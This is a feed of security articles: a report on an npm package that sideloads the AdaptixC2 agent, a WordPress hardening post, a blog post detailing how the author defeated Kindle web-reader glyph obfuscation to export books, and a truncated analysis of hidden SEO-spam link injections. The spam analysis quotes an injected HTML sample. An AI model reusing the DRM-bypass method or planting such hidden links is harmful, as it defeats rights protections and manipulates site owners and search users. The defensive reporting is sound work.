In spring of 2025, the framework was first observed being used for malicious means.In October 2025, Kaspersky experts found that the npm ecosystem contained a malicious package with a fairly convincing name: . It was posing as a utility for using proxies within projects. At the time of this post, the package had already been taken down.The name of the package closely resembles popular legitimate packages: , which has approximately 70 million weekly downloads, and  with 90 million downloads respectively. Furthermore, the advertised proxy-related functionality was cloned from another popular legitimate package , which boasts 50 million weekly downloads. However, the threat actor injected a post-install script into , which downloads and executes a payload containing the AdaptixC2 agent.Metadata for the malicious (left) and legitimate (right) packagesThe script includes various payload delivery methods for different operating systems. The package includes loading mechanisms for Windows, Linux, and macOS. In each OS, it uses specific techniques involving system or user directories to load and launch the implant.In Windows, the AdaptixC2 agent is dropped as a DLL file into the system directory . It is then executed via DLL sideloading. The JS script copies the legitimate  file to the same directory and executes it, thus loading the malicious DLL.Deobfuscated Windows-specific code for loading AdaptixC2In macOS, the script downloads the payload as an executable file into the user’s autorun directory: . The  script also drops a plist autorun configuration file into this directory. Before downloading AdaptixC2, the script checks the target architecture (x64 or ARM) and fetches the appropriate payload variant.Deobfuscated macOS-specific code for loading AdaptixC2In Linux, the framework’s agent is downloaded into the temporary directory . The script delivers a binary file tailored to the specific architecture (x64 or ARM) and then assigns it execute permissions.Deobfuscated Linux-specific code for loading AdaptixC2Once the AdaptixC2 framework agent is deployed on the victim’s device, the attacker gains capabilities for remote access, command execution, file and process management, and various methods for achieving persistence. This both allows the attacker to maintain consistent access and enables them to conduct network reconnaissance and deploy subsequent stages of the attack.This is not the first attack targeting the npm registry in recent memory. A month ago, similar infection methods utilizing a post-install script were employed in the high-profile incident involving the Shai-Hulud worm, which infected more than 500 packagesThe AdaptixC2 incident clearly demonstrates the growing trend of abusing open-source software ecosystems, like npm, as an attack vector. Threat actors are increasingly exploiting the trusted open-source supply chain to distribute post-exploitation framework agents and other forms of malware. Users and organizations involved in development or using open-source software from ecosystems like npm in their products are susceptible to this threat type.

After all, WordPress is often associated with open-source plugins, community themes, and a wide range of deployment practices—some stronger than others. But that perception overlooks what modern WordPress can deliver when it’s architected, operated, and governed with discipline. In our Digital Experience Platform (DXP) at Malwarebytes, WordPress serves as the content layer—an editorial hub that feeds multiple customer experiences.The reason is pragmatic and security-forward. WordPress offers transparency (open code and ecosystem), control (self-hosted in our environment, with strict governance), and maturity (a seasoned core with an established security model). Combined with a decoupled architecture, strong identity and access controls, rigorous supply chain management, and a hardened infrastructure, WordPress becomes an ideal content engine for an enterprise-grade, security-first DXP within an enterprise-grade MarTech stack.DXP vision and the role of WordPressWhen we say DXP, we mean the orchestration layer that brings together content, personalization, analytics, experimentation, commerce, support experiences, and more. It’s not a single product; it’s the way we coordinate systems to deliver cohesive customer journeys across web, mobile, and product surfaces.In that model, WordPress is our content authoring hub. Editors draft, review, and publish content once; APIs then power multiple front-ends—websites built with Next.js/React, mobile applications, and support portals. This headless pattern decouples the authoring experience from delivery.By delivering both static and server-side rendered (SSR) pages directly from the edge, we meet aggressive latency goals and excel in Core Web Vitals scores on a global scale. This approach ensures content is as close as possible to end users, providing consistently fast load times regardless of location. Our architecture isolates site performance from backend processes, meaning bursts of traffic or complex deployments don’t degrade the visitor experience.Security isolation is equally foundational to our platform design. The public-facing runtime never exposes the WordPress admin interface or control endpoints—instead, these administrative components reside securely behind private networking, protected by robust access controls and authentication. This segmentation shields both business-critical operations and sensitive data, lowering the attack surface and reducing risk without impeding editors or developers.This architecture also boosts development velocity. Front-end engineers can iterate rapidly, independently releasing new features or improvements without being bottlenecked by backend deployments. At the same time, content editors retain full publishing agility via the headless CMS, able to launch and update site content at will. This parallel, decoupled workflow ensures that technical and editorial teams each operate at their highest efficiency, supporting an environment of continuous innovation and timely content delivery.Rapid and reliable deployments are a cornerstone of our security posture, empowering us to respond quickly to new threats and vulnerabilities. By streamlining and automating our release processes, we can efficiently ship patches and mitigations as soon as issues arise, minimizing the window of exposure. Equally important, our deployment pipelines are built to support safe rollbacks, allowing us to confidently revert any changes that introduce instability or unexpected behavior—maintaining operational continuity no matter how urgent the circumstances.Shortening our development and deployment cycle is not just about speed—it’s one of the most effective security controls we employ. Frequent, predictable deploys mean our systems are always running the latest protections and bug fixes, dramatically reducing the risks associated with outdated code or configurations. This agility ensures we stay ahead of evolving threats, support innovation without sacrificing safety, and adapt to changing requirements with minimal disruption, making security a continuous, integrated aspect of our delivery workflow.Why WordPress aligns with security-firstOpen-source transparency matters. With WordPress, we can inspect every line of core and plugin code, run our own audits, and make informed decisions about the attack surface. The community’s response to security issues adds resilience through coordinated disclosures, rapid patches, and widely disseminated advisories.The core platform is mature and stable. The WordPress security team has established processes for responsible disclosure and a consistent patch cadence. Operating close to core (and avoiding heavy core modifications) enables us to adopt updates quickly.Finally, talent availability accelerates secure outcomes. A large pool of WordPress developers and security practitioners means faster remediation, effective code reviews, and a healthy ecosystem of best practices and tooling.Architecture that reduces risksHeadless/decoupled architectureOur public website leverages the powerful combination of a Content Delivery Network (CDN) and a Web Application Firewall (WAF) to deliver a seamless and secure user experience. By distributing static content across global edge locations, the CDN ensures lightning-fast load times while also enabling server-side rendering at the edge for dynamic content. This hybrid approach allows us to serve both static and server-rendered pages efficiently, providing relevant content with minimal latency. Positioned behind the CDN, the WAF offers an added layer of security by blocking malicious traffic and safeguarding our site from threats, ensuring that both performance and protection are at the forefront of our web infrastructure.To further enhance security and streamline workflows, we utilize single sign-on (SSO) with multi-factor authentication (MFA) for accessing all administrative interfaces and developer endpoints. The WordPress admin area, GraphQL and REST APIs, as well as build hooks, are only accessible through this robust SSO with MFA, ensuring that only authorized team members can reach sensitive controls and data. Access is strictly segmented, treating the admin plane as an internal-only application and fully separating it from the public-facing site. This architecture minimizes risk, protects critical infrastructure, and supports efficient, secure collaboration among our administrative and development teams.Network and edge securityOur Web Application Firewall (WAF) works in tandem with advanced bot management to protect our site from a wide range of online threats. The WAF actively filters malicious payloads and prevents exploitation attempts, while the bot management system blocks known bad actors and suspicious automated traffic. Together, they help enforce rate limits—ensuring fair usage and preventing abuse that could impact site performance or security. This layered approach allows us to maintain a reliable, secure environment for all our users while shielding our resources from sophisticated cyber threats.To further secure our infrastructure, we have robust DDoS mitigation controls in place, designed to identify and absorb large-scale volumetric attacks before they reach our application. Coupled with customizable geo-blocking and ASN (Autonomous System Number) policies, we can restrict or filter access from high-risk regions and networks known for hostile activity. This proactive combination not only helps protect against both widespread and targeted attacks, but also ensures the continued availability and performance of our services for legitimate users around the globe.We enforce modern transport security standards across our entire platform by mandating TLS 1.3 for all connections. This ensures data transmitted between users and our site is encrypted using the latest, most secure protocol available. In addition, HTTP Strict Transport Security (HSTS) is enabled, compelling browsers to interact with our site only via secure HTTPS connections. Together, TLS 1.3 and HSTS provide strong guarantees of data integrity, confidentiality, and protection against common interception or downgrade attacks, giving our users peace of mind with every interaction.Service isolation and least privilegeOur security framework is built on the principle of least-privilege access, ensuring that databases, object storage, and service accounts are tightly controlled. Each system and user is granted only the permissions essential for their specific role—nothing more. This minimizes the potential impact of accidental or malicious activity, as access is segmented and strictly limited across all layers of our architecture. By aligning permissions closely with functional requirements, we significantly reduce the risk of data exposure or unauthorized operations, reinforcing the integrity and confidentiality of our platform.Hardening at the application layerIn our production WordPress environment, we implement a series of stringent measures to protect both the core application and user data. File editing through the wp-admin interface is completely disabled, eliminating a common attack vector and reducing the risk of unauthorized code changes. We enforce the use of strong, unique salts and keys, enhancing the integrity and security of authentication cookies and stored data. Additionally, the core filesystem is kept strictly read-only in production, preventing alterations to critical files and ensuring that even in the event of a compromise, attackers cannot modify system-level code or inject persistent threats.To further reduce the platform’s attack surface, we restrict XML-RPC functionality—often abused for brute-force attacks—and limit exposed REST API endpoints strictly to those required by our headless WordPress clients. User enumeration patterns, which attackers may exploit to gather account names, are actively blocked, thereby safeguarding user identities. On the front end, we enforce robust security headers, including a finely scoped Content Security Policy (CSP) to mitigate XSS threats, strict X-Frame-Options and Frame-Ancestors to prevent clickjacking, X-Content-Type-Options to block MIME-type attacks, and a privacy-friendly Referrer-Policy to minimize information leakage. Together, these layered controls ensure our site remains resilient against a broad spectrum of web threats.Auth and session securityWe integrate Single Sign-On (SSO) through industry-standard protocols such as SAML and OIDC, streamlining secure access for our teams while reducing the risks associated with password proliferation. Automated user provisioning and deprovisioning are managed via SCIM, ensuring that access is immediately granted to new team members and promptly revoked when it’s no longer needed. MFA is mandatory for all privileged users, significantly strengthening the security of critical accounts and administrative functions, and defending against credential-based attacks.Access within our environment is granted based on granular, role- and capability-based policies. Custom roles are carefully tailored so that editors, contributors, and admins receive only the permissions essential to their responsibilities, minimizing exposure and preventing privilege creep. We further secure administrative access by enforcing short-lived sessions, reducing the window of opportunity for session hijacking or misuse. This approach ensures that even if an administrative session is compromised, the potential for abuse is tightly constrained, keeping our site and its data safe.Security is at the forefront of our development practices, with a strong emphasis on protecting both our site and its users from application-level threats. We enforce the use of prepared statements for all database queries to defend against SQL injection, mandate thorough output escaping to prevent cross-site scripting (XSS), and ensure rigorous input sanitization in every layer of custom code and approved plugins. For protection against cross-site request forgery (CSRF), we implement nonces, providing an additional safeguard to validate user actions and prevent unauthorized commands. This multifaceted approach applies to every custom solution and trusted extension, reinforcing the reliability and trustworthiness of our platform.Data privacy and compliance round out our security strategy. We are committed to minimizing the storage of personally identifiable information (PII), classifying data sensitivity, and applying data retention policies that align with both regulatory requirements and customer expectations. Consent management is thoughtfully integrated into both our publishing workflow and the front-end user experience, so we can uphold privacy standards without sacrificing usability. This ensures users remain informed and in control of their data—supporting compliance with privacy laws and building trust through transparency and respect for user choices.Plugin and supply chain governanceOur approach to plugin management is deliberately conservative, maintaining a strict allowlist to ensure only vetted and essential plugins are present within our environment. We prioritize the use of “must-use” (mu-) plugins for enforcing global policies and delivering critical functionality, as these plugins are always active and centrally managed. This strategy prevents unauthorized or unnecessary code from entering our system, supports consistency across environments, and enables us to embed security controls directly into our platform’s foundational layers.Before any plugin or theme is deployed to production, it undergoes a comprehensive code review process to assess security, performance, and compatibility. We are proactive in curbing plugin sprawl, regularly auditing our stack and removing redundant or unsupported components to minimize complexity and reduce our attack surface. By keeping our codebase lean and disciplined, we not only defend against potential vulnerabilities found in third-party additions but also streamline maintenance and updates, ensuring the long-term stability and security of our production environment.We take a comprehensive approach to dependency management and software supply chain integrity by generating Software Bill of Materials (SBOMs) for both PHP and JavaScript codebases. SBOMs allow us to track all direct and transitive dependencies, as well as their associated licenses, ensuring greater visibility and control over the components that make up our application. Dependencies are always pinned and locked to specific, approved versions, reducing the risk of introducing vulnerabilities through unintentional upgrades or changes. Automated tools like Dependabot continuously monitor for updates and propose them, but nothing reaches production unless it successfully passes through our continuous integration (CI) security gates.Our CI/CD pipeline is fortified with robust security controls at every stage. Every update, whether a dependency or code change, triggers automated Static Application Security Testing (SAST) and Dynamic Application Security Testing (DAST) to identify potential vulnerabilities both before and during runtime. We employ secret scanning to prevent accidental exposure of credentials and keys, and every build is evaluated for license compliance and regulatory conformance. This layered approach ensures that our development processes are secure by default, continually verifying software quality, integrity, and compliance before anything is deployed to production.Vulnerability intelligence and patchingWe actively monitor CVE feeds and WordPress-focused security advisories, such as WPScan, to stay ahead of emerging vulnerabilities and threats. By keeping a close eye on both general and platform-specific intelligence sources, we’re able to rapidly identify potential risks relevant to our infrastructure. Upon detection, vulnerabilities are triaged and addressed according to well-defined Service Level Agreements (SLAs) based on severity—ensuring that critical issues receive immediate attention and routine patches are managed efficiently. This structured, proactive posture helps us mitigate risk and maintain the ongoing security and stability of our environment.In the rare event that a critical vulnerability threatens operational security or integrity, we are prepared with fast rollback plans that allow us to swiftly revert to a secure state. These procedures are designed to be executed with minimal disruption, ensuring urgent patches can be applied without causing extended downtime for users or administrators. By integrating rapid response capabilities into our workflows, we’re able to act decisively and minimize exposure, all while maintaining service availability and reliability at the highest standard.Infrastructure security operationsWe enforce strict secret management practices by using a centralized vault or cloud-native secret store to handle all sensitive credentials, API keys, and configuration secrets. No secrets are ever embedded in source code or stored within deployment images, reducing the risk of accidental exposure. Secret rotation is scheduled regularly as part of our operational cadence, ensuring that credentials remain fresh and limiting the window of opportunity for misuse even if a secret were somehow compromised.All data is secured with encryption both at rest and in transit, leveraging strong cryptographic controls across storage and networking layers. Where supported, our databases rely on IAM-based authentication instead of static credentials, further minimizing the risk associated with traditional username-password pairs. This approach not only enhances security but also streamlines access control and auditability, underpinning our commitment to robust, modern data protection practices throughout the stack.Backups and disaster recoveryOur disaster recovery strategy rests on maintaining versioned, immutable backups that cannot be altered or deleted, providing a reliable safeguard against data loss, corruption, or ransomware attacks. These backups are created on a regular schedule and include not only application data, but also content, media assets, and configuration files. We conduct periodic restore drills to validate that our backups are effective and to ensure our team is prepared to execute recovery procedures smoothly. Explicit Recovery Time Objectives (RTOs) and Recovery Point Objectives (RPOs) are defined, routinely tested, and adjusted as needed to meet the demands of our operations and regulatory obligations.Data recovery playbooks are meticulously maintained and encompass every critical aspect of our environment, from core content and media to infrastructure-as-code templates that can quickly and predictably rebuild our systems. These playbooks provide step-by-step guidance for recovering data and restoring services, whether in response to accidental deletion, hardware failure, or a targeted attack. By rigorously documenting and testing these processes, we ensure a high degree of resilience and confidence in our ability to restore normal operations with minimal disruption, safeguarding both our assets and the experience of our users.Observability and responseWe maintain a comprehensive observability stack with centralized, structured logging that aggregates data from all key layers—Nginx, PHP-FPM, WordPress, and supporting services. This logging is enriched with real-time metrics and distributed traces, giving us end-to-end visibility into application performance and user activity across our digital experience platform (DXP). All logs are funneled into a Security Information and Event Management (SIEM) system, which acts as the nerve center for detecting and investigating potential threats. Hosts and containers are further protected by Endpoint Detection and Response (EDR) solutions, providing continuous monitoring and the ability to quickly isolate and remediate suspicious behavior.To enhance detection and incident response, we employ automated anomaly detection and maintain detailed runbooks, dramatically reducing our mean time to detect (MTTD) and mean time to respond (MTTR) to issues. Our security posture is continually tested and validated through regular penetration tests and an active bug bounty program that focus on the entire surface of our DXP, not just on isolated components. This holistic approach ensures we proactively identify vulnerabilities, address weaknesses before they can be exploited, and ultimately maintain a resilient, trustworthy platform for our users and customers.When it comes to building or selecting hosting for your organization’s sensitive data and mission-critical applications, certifications matter—a lot. Obtaining FedRAMP Moderate certified ensures compliance with rigorous federal security standards, making it a necessity for government-related workloads and a great standard for any organization to abide. Similarly, a SOC 2 Type 1 certification demonstrates that a hosting provider has established robust systems and controls to protect data and ensure privacy, fostering client trust and accountability.GovRAMP Moderate is critical for U.S. government contractors working with state and local government workloads, ensuring additional layers of compliance and security. If your data processing touches on European clients or users, GDPR and the Data Privacy Framework offer reassurance that personal data is handled and processed lawfully, transparently, and securely. Equally important is the Microsoft SSPA, a must-have for vendors providing services to Microsoft or handling its data. Lastly, WCAG 2.0 AA compliance ensures that your hosted applications and websites are accessible to users and employees with disabilities, strengthening your commitment to inclusivity and expanding your reach. By prioritizing these certifications, organizations not only safeguard compliance and security, but also demonstrate a dedication to transparency, privacy, and accessibility in today’s digital landscape.Editorial workflow governanceEvery administrative and content-related event is thoroughly audit-logged, capturing a detailed trail of actions for review and oversight. These logs are fully exportable, supporting compliance with regulatory requirements and internal governance policies. By maintaining comprehensive and accessible audit records, we provide the transparency necessary to facilitate investigations, enforce accountability, and demonstrate adherence to best practices and legal obligations—ensuring peace of mind for our organization and stakeholders alike.Secure content operationsWe prioritize security awareness by providing editors with ongoing training on critical topics, such as phishing recognition, safe link practices, and our governance policies for embedded scripts and third-party widgets. This continual education helps staff identify and avoid social engineering attacks, understand the risks associated with external content, and adhere to protocols that maintain the integrity and security of our web platform. By empowering editors with the knowledge to make secure decisions, we reduce the likelihood of errors that could compromise the site or expose sensitive information.To further protect user interactions, especially on forms, we deploy layered anti-spam defenses, implement bot challenges like CAPTCHAs, and set server-side rate limits to prevent abuse. All form inputs are validated on the server, ensuring robust protection even if client-side checks are bypassed or disabled. This disciplined approach to input handling and abuse prevention ensures our forms remain a secure channel for legitimate user engagement while blocking malicious actors and automated attacks.Our performance strategy centers on comprehensive caching and efficient data handling to deliver a fast, reliable experience for both users and administrators. Edge and page-level caching shield our origin servers by intercepting and serving frequent requests directly at the edge, dramatically reducing the number of dynamic requests that reach the core infrastructure. Object caching solutions like Redis, coupled with thoughtfully optimized queries, keep the admin interface responsive and ensure APIs remain quick even under load. We routinely profile database queries and set strict performance budgets for the slowest paths, preventing regressions that could degrade performance or escalate into broader availability issues. This layered approach ensures our platform stays speedy, stable, and scalable as demands grow.Every code change in our workflow is subjected to automated testing, with comprehensive suites that verify functionality, performance, and security. Security gates are tightly integrated into the CI/CD pipeline, ensuring that no changes are merged if any issues or vulnerabilities are detected. Our deployment processes are fully automated and repeatable, significantly reducing the potential for human error and guaranteeing that releases are consistent, predictable, and recoverable.By managing our infrastructure as code, we further ensure that all environments—from development to production—are consistent, auditable, and easily reproducible. This approach not only accelerates the provisioning of resources and the rollout of updates, but also strengthens compliance and traceability, providing a solid foundation for scalability, reliability, and continuous improvement.We finely tune our security headers and Content Security Policies (CSPs) to deliver robust protection without disrupting the user experience, ensuring that all site functionality remains seamless and accessible. Our commitment to performance extends to advanced image optimization, responsive asset delivery, and strict adherence to accessibility standards, enabling our content to load quickly and be usable by everyone. By consistently delivering fast, accessible pages, we not only enhance user engagement but also enable rapid, safe deployment cycles—minimizing potential attack windows through swift rollouts and efficient rollbacks, and maintaining both security and usability at the core of our platform.Proprietary Digital Experience Platforms (DXPs) present a compelling all-in-one suite of features that can streamline operations for many organizations. However, their advantages often come with trade-offs: these platforms tend to be resource intensive, both in terms of infrastructure and licensing fees, and may lack the granular transparency required for deep security audits or targeted customizations. The inherent complexity and tightly-coupled nature of these solutions can slow the pace of change—making it challenging to adapt or patch emergent threats rapidly, which is itself a significant security and business risk in dynamic environments.Headless-only SaaS CMSes, on the other hand, are designed for flexibility and API excellence, offering developers modern tooling and a frictionless integration experience. Despite these strengths, organizations may encounter challenges such as vendor lock-in, which can limit strategic choices and agility over time. Control over patching and updates is usually in the hands of the SaaS provider, potentially creating gaps between issue discovery and remediation. Further, these platforms may present hurdles in regions with strict data residency or compliance requirements, making them less suitable for regulated industries or global enterprises with nuanced jurisdictional needs.Systems like Drupal or fully-custom CMS architectures can undoubtably satisfy enterprise requirements for scale, extensibility, and security. However, in our evaluation, team expertise, the maturity and momentum of the adjacent tooling ecosystem, and a clear view of total cost of ownership all ultimately favored the adoption of WordPress. WordPress’s balance of flexibility, a wealth of existing integrations, well-understood operational paradigms, and strong community support enables us to deliver on our goals efficiently while ensuring we maintain the adaptability, security, and cost-effectiveness our organization requires.WordPress provides the best mix of transparency, control, ecosystem breadth, and speed—when paired with our security architecture and operating model.Lessons learned and best practicesStart headless and isolate the admin plane from day one.Enforce SSO and MFA, least privilege roles, and formal change approval.Treat plugins as third-party code: audit, monitor, and patch under SLAs.Invest in observability and rehearse incident response regularly.Keep WordPress core close to vanilla; extend through vetted plugins and mu-plugins, not core forks.Security is not a property of a tool; it’s the outcome of architecture, governance, and culture. With a decoupled design, rigorous controls, and a disciplined operational posture, WordPress is a strong foundation for the content layer of an enterprise DXP—combining the openness and speed teams want with the security and control the business requires of its MarTech stack.]]></content:encoded></item><item><title>How I Reversed Amazon&apos;s Kindle Web Obfuscation Because Their App Sucked</title><link>https://blog.pixelmelt.dev/kindle-web-drm/</link><author>/u/AlmondOffSec</author><category>netsec</category><pubDate>Fri, 17 Oct 2025 07:06:21 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[I bought my first ebook from amazonAmazon's Kindle Android app was really buggy and crashed a bunchTried to download my book to use with a functioning reader appRealized Amazon no longer lets you do thatDecided to reverse engineer their obfuscation system out of spiteDiscovered multiple layers of protection including randomized alphabetsDefeated all of them with font matching wizardryPart 1: Amazon Made This PersonalThe One Time I Tried To Do Things The Right WayI've been "obtaining" ebooks for years. But this ONE time, I thought: "Let's support the author."Download Kindle app on Android. Open book.I Just Wanted To Read My BookApp crashes. Fine, I'll use the web reader.Oh wait, can't download it for offline reading. What if I'm on a plane?Hold on, I can't even export it to Calibre? Where I keep ALL my other books?So let me get this straight:I paid money for this bookI can only read it in Amazon's broken appAmazon can delete it whenever they wantThis is a rental, not a purchase.I could've refunded and "obtained" it in 30 seconds. Would've been easier.But that's not the point.The point is I PAID FOR THIS BOOK. It's mine. And I'm going to read it in Calibre with the rest of my library even if I have to reverse engineer their web client to do it.Kindle Cloud Reader (the web version) actually works. While looking through the network requests, I spotted this:https://read.amazon.com/renderer/render
To download anything, you need:1. Session cookies - standard Amazon login2. Rendering token - from the startReading API call3. ADP session token - extra auth layerSending the same headers and cookies the browser does returns a TAR file.page_data_0_4.json   # The "text" (spoiler: it's not text)
glyphs.json          # SVG definitions for every character
toc.json             # Table of contents
metadata.json        # Book info
location_map.json    # Position mappingsPart 3: Amazon's Obfuscation Layers of Ebook HellDownloaded the first few pages, expected to see text. Got this instead:{
  "type": "TextRun",
  "glyphs": [24, 25, 74, 123, 91, 18, 19, 30, 4, ...],
  "style": "paragraph"
}These aren't letters. They're glyph IDs. Character 'T' isn't Unicode 84, it's glyph 24.And glyph 24 is just a series of numbers that define a stroke path, its just an image of a letter.It's a substitution cipher! Each character maps to a non-sequential glyph ID.The Alphabet Changes Every. Five. Pages.Downloaded the next batch of pages. Same letter 'T' is now glyph 87.They randomize the entire alphabet on EVERY request.You can only get 5 pages at a time (API hard limit)Each request gets completely new glyph mappingsGlyph IDs are meaningless across requestsYou can't build one mapping table for the whole bookLet Me Show You How Bad This Is184 separate API requests needed184 different random alphabets to crack discovered (a-z, A-Z, punctuation, ligatures) to decodeFake Font Hints (They're Getting Sneaky)Some SVG paths contained this garbage:M695.068,0 L697.51,-27.954 m3,1 m1,6 m-4,-7 L699.951,-55.908 ...Looking at it, we see these tiny  commands, they are micro MoveTo operations.Browsers handle them fine (native Path2D)Python SVG libraries create spurious connecting linesMakes glyphs look corrupted when rendered naivelyBreaks path-sampling approachesThis is deliberate anti-scraping. The glyphs render perfectly in browser but make it so we cant just compare paths in our parser.Eventually I figured out that filling in the complete path mitigated this.Not just one font. FOUR variants:bookerly_normal (99% of glyphs)bookerly_italic (emphasis)bookerly_bolditalic (emphasized headings)Plus special ligatures: ff, fi, fl, ffi, fflMore variations = more unique glyphs to crack = more pain.OCR Is Mid (My Failed Attempt)Tried running OCR on rendered glyphs. Results:178/348 glyphs recognized (51%)170 glyphs failed completelyOCR just sucks at single characters without context. Confused 'l' with 'I' with '1'. Couldn't handle punctuation. Gave up on ligatures entirely.OCR probably need words and sentences to work well.Part 4: The Solution That Actually WorkedEvery request includes `glyphs.json` with SVG path definitions:{
  "24": {
    "path": "M 450 1480 L 820 1480 L 820 0 L 1050 0 L 1050 1480 ...",
    "fontFamily": "bookerly_normal"
  },
  "87": {
    "path": "M 450 1480 L 820 1480 L 820 0 L 1050 0 L 1050 1480 ...",
    "fontFamily": "bookerly_normal"
  }
}Glyph IDs change, but SVG shapes don't.First attempt: normalize and compare SVG path coordinates.Coordinates vary slightlyPath commands represented differentlyScrew coordinate comparison. Let's just render everything and compare pixels.1. Render every SVG as an imageUse cairosvg (lets us handle those fake font hints correctly)Render at 512 x 512px for accuracy2. Generate perceptual hashesThe hash becomes the unique identifierSame shape = same hash, regardless of glyph ID3. Build normalized glyph spaceMap all 184 random alphabets to hash-based IDsNow glyph "a1b2c3d4..." always means letter 'T'4. Match to actual charactersDownload Bookerly TTF fontsRender every character (A-Z, a-z, 0-9, punctuation)Use SSIM (Structural Similarity Index) to matchWhy SSIM Is Perfect For ThisSSIM compares image structure, not pixels directly. It handles:Slight rendering differencesFor each unknown glyph, find the TTF character with highest SSIM score. That's your letter. ff, fi, fl, ffi, fflThese are single glyphs for multiple charactersHad to add them to TTF library manually em-dash, quotes, bulletsExtended character set beyond basic ASCIIMatched against full Unicode range in Bookerly Bold, italic, bold-italicBuilt separate libraries for each variantMatch against all libraries, pick best scorePart 5: The Moment It All Worked=== NORMALIZATION PHASE ===
Total batches processed: 184
Unique glyphs found: 361
Total glyphs in book: 1,051,745

=== MATCHING PHASE ===
Successfully matched 361/361 unique glyphs (100.00%)
Failed to match: 0 glyphs
Average SSIM score: 0.9527

=== DECODED OUTPUT ===
Total characters: 5,623,847
Pages: 920Perfect. Every single character decoded correctly.The JSON includes positioning for every text run:{
  "glyphs": [24, 25, 74],

  "fontStyle": "italic",
  "fontWeight": 700,
  "fontSize": 12.5,
  "link": {"positionId": 7539}
}Paragraph breaks (Y-coordinate changes)Text alignment (X-coordinate patterns)The final EPUB is near indistinguishable from the original!Amazon put real effort into their web obfuscation.To prove a point? Absolutely.To learn about SVG rendering, perceptual hashing, and font metrics? Probably yes.Use This Knowledge ResponsiblyThis is for backing up books YOU PURCHASED.Don't get me sued into oblivion thanks.Due to the nature of this post, if you are in any way affiliated with Amazon, please reach out to pixelmelt + at + protonmail.com.]]></content:encoded></item><item><title>SEO spam and hidden links: how to protect your website and your reputation</title><link>https://securelist.com/seo-spam-hidden-links/117782/</link><author>Anna Larkina</author><category>threatintel</category><enclosure url="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/10/16210132/SL-seo-spam-featured-150x150.jpg" length="" type=""/><pubDate>Fri, 17 Oct 2025 07:00:55 +0000</pubDate><source url="https://securelist.com/">Securelist</source><content:encoded><![CDATA[When analyzing the content of websites in an attempt to determine what category it belongs to, we sometimes get an utterly unexpected result. It could be the official page of a metal structures manufacturer or online flower shop, or, say, a law firm website, with completely neutral content, but our solutions would place it squarely in the “Adult content” category. On the surface, it is completely unclear how our systems arrived at that verdict, but one look at the content categorization engine’s page analysis log clears it up.Invisible HTML block, or SEO spamThe website falls into the questionable category because it contains an HTML block with links to third-party sites, invisible to regular users. These sites typically host content of a certain kind – which, in our experience, is most often pornographic or gambling materials – and in the hidden block, you will find relevant keywords along with the links. These practices are a type of Black Hat SEO, or SEO spam: the manipulation of website search rankings in violation of ethical search engine optimization (SEO) principles. Although there are many techniques that attackers use to raise or lower websites in search engine rankings, we have encountered hidden blocks more frequently lately, so this is what this post focuses on.Website owners rarely suspect a problem until they face obvious negative consequences, such as a sharp drop in traffic, warnings from search engines, or complaints from visitors. Those who use Kaspersky solutions may see their sites blocked due to being categorized as prohibited, a sign that something is wrong with them. Our engine detects both links and their descriptions that are present in a block like that.Hyperlinks that are invisible to regular users but still can be scanned by various analytical systems, such as search engines or our web categorization engine, are known as “hidden links”. They are often used for scams, inflating website rankings (positions in search results), or pushing down the ranking of a victim website.To understand how this works, let us look at how today’s SEO functions in the first place. A series of algorithms is responsible for ranking websites in search results, such as those served by Google. The oldest and most relevant one to this article is known as PageRank. The PageRank metric, or weight in the context of this algorithm, is a numerical value that determines the importance of a specific page. The higher the number of links from other websites pointing to a page, and the greater those websites’ own weights, the higher the page’s PageRank.So, to boost their own website’s ranking in search results, the malicious actor places hidden links to it on the victim website. The higher the victim website’s PageRank, the more attractive it is to the attacker. High-traffic platforms like blogs or forums are of particular interest to them.However, PageRank is no longer the only method search engines use to measure a website’s value. Google, for example, also applies other algorithms, such as the artificial intelligence-based RankBrain or the BERT language model. These algorithms use more sophisticated metrics, such as Domain Authority (that is, how much authority the website has on the subject the user is asking about), link quality, and context. Placing links on a website with a high PageRank can still be beneficial, but this tactic has a severely limited effect due to advanced algorithms and filters aimed at demoting sites that break the search engine’s rules. Examples of these filters are as follows:Google Penguin, which identifies and penalizes websites that use poor-quality or manipulative links, including hidden ones, to boost their own rankings. When links like these are detected, their weight can be zeroed out, and the ranking may be lowered for both sites: the victim and the spam website.Google Panda, which evaluates content quality. If the website has a high PageRank, but the content is of low quality, duplicated, auto-generated, or otherwise substandard, the site may be demoted.Google SpamBrain, which uses machine learning to analyze HTML markup, page layouts, and so forth to identify manipulative patterns. This algorithm is integrated into Google Penguin.What a Black Hat SEO block looks like in a page’s HTML markupLet us look at some real examples of hidden blocks we have seen on legitimate websites and determine the attributes by which these blocks can be identified.<div style="display: none;">

This example utilizes a simple CSS style, 
			. This is one of the most basic and widely known methods for concealing content; the parameter 
			; stands for “do not display”. We also see that each invisible 
			 section contains a set of links to low-quality pornographic websites along with their keyword-stuffed descriptions. This clearly indicates spam, as the website where we found this block has no relation whatsoever to the type of content being linked to.Another sign of Black Hat SEO in the example is the attribute 
			. This instructs search engines that the link carries link juice, meaning it passes weight. Spammers intentionally set this attribute to transfer authority from the victim website to the ones they are promoting. In standard practice, webmasters may, conversely, use 
			, which signifies that the presence of the link on the site should not influence the ranking of the website where it leads.Thus, the combination of a hidden block (
			) and a set of external pornographic (in this instance) links with the 
			 attribute unequivocally point to a SEO spam injection.Note that all 
			 sections are concentrated in one spot, at the end of the page, rather than scattered throughout the page code. This block demonstrates a classic Black Hat SEO approach.<div style="overflow: auto; position: absolute; height: 0pt; width: 0pt;">سكس انجليز <a href="https://wfporn.com/" target="_self" title="wfporn.com افلام سحاق مترجم">wfporn.com</a> سكس كلاسيك مترجم</div>

This example demonstrates a slightly more sophisticated approach to hiding the block containing Black Hat SEO content. It suggests an attempt to bypass the automated search engine filters that easily detect the 
			 parameter.Let us analyze the set of CSS styles: 
			. The properties position: 
			 remove the block from the visible area of the page, while overflow: auto prevents the content from being displayed even if it exceeds zero dimensions. This makes the links inaccessible to humans, but it does not prevent them from being preserved in the DOM (document object model). That’s why HTML code scanning systems, such as search engines, are able to see it.In addition to the zero dimensions of the block, in this example, just as in the previous one, we see the attribute 
			, as well as many links to pornographic websites with relevant keywords.The combination of styles that sets the block dimensions to zero is less obvious than 
